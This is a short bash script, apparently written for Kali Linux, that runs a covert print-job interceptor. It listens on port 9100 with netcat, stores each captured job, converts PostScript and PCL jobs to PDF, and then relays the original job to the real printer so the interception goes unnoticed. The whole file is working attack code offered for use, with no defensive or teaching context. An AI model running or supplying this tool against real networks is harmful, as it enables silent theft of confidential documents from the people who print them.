#!/bin/bash

# Configure paths and printer info
SAVE_DIR="/home/kali/Desktop/API"
FORWARD_IP="192.168.1.50"    # Replace with your real printer IP
FORWARD_PORT=9100

mkdir -p "$SAVE_DIR"

echo "[+] Print interceptor is running on port 9100..."
while true; do
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    RAW_FILE="$SAVE_DIR/job_$TIMESTAMP.raw"
    PDF_FILE="$SAVE_DIR/job_$TIMESTAMP.pdf"

    echo "[*] Waiting for incoming job..."
    nc -l -p 9100 > "$RAW_FILE"

    FILETYPE=$(file "$RAW_FILE")
    echo "[*] Detected format: $FILETYPE"

    if echo "$FILETYPE" | grep -q "PostScript"; then
        echo "[*] Converting PostScript to PDF..."
        gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile="$PDF_FILE" "$RAW_FILE"
    elif echo "$FILETYPE" | grep -q "PCL"; then
        echo "[*] Converting PCL to PDF..."
        pcl6 -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile="$PDF_FILE" "$RAW_FILE"
    else
        echo "[!] Unknown format — saving raw only"
    fi

    echo "[*] Forwarding to actual printer at $FORWARD_IP..."
    cat "$RAW_FILE" | nc "$FORWARD_IP" "$FORWARD_PORT"

    echo "[✔] Job handled and logged as $PDF_FILE"
done
